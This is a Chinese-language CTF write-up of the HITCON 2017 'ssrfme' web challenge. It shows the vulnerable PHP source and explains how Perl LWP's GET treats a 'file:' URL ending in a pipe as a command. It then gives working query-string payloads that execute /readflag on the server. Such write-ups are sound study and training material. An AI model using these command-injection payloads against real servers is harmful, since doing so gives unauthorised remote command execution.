# ssrfme

> 分类：Web

## 题目描述

SSRF 题。调用 `GET`（Perl LWP）命令执行从 url 获取的内容，按 filename 写入文件。

## 考察知识点

- Perl open 函数命令执行
- Perl GET 命令执行漏洞
- file 协议

## 解法

源码：

```php
<?php
    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    @mkdir($sandbox);
    @chdir($sandbox);

    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    $info = pathinfo($_GET["filename"]);
    $dir  = str_replace(".", "", basename($info["dirname"]));
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info["basename"]), $data);
    highlight_file(__FILE__);
```

关键点：Perl 的 `open` 函数支持管道符执行命令：

```perl
open(FD, "|id");  # 执行 id
```

Perl 的 `GET` 函数（LWP 库）底层调用了 open，且支持 `file:` 协议。因此：

```
GET 'file:id|'
```

会执行 `id` 命令。

利用思路：通过 `url` 参数传入 `file:命令|`，`filename` 参数控制写入的文件名，最终访问生成的文件执行命令。

payload（读取 /readflag）：

```
?url=file:bash%20-c%20/readflag|&filename=bash%20-c%20/readflag|
```

或分两步：先创建同名文件（满足路径存在），再执行命令。

```
?url=&filename=|/readflag        # 创建文件
?url=file:|readflag&filename=123 # 执行命令
访问 sandbox/MD5(orange+ip)/123
```

## 参考答案

（flag 通过执行 /readflag 后读取）

## 来源

- 作者：LoRexxar / Orange | https://lorexxar.cn/2017/11/10/hitcon2017-writeup/
- 作者：kar3a | https://www.cnblogs.com/karsa/p/14111891.html
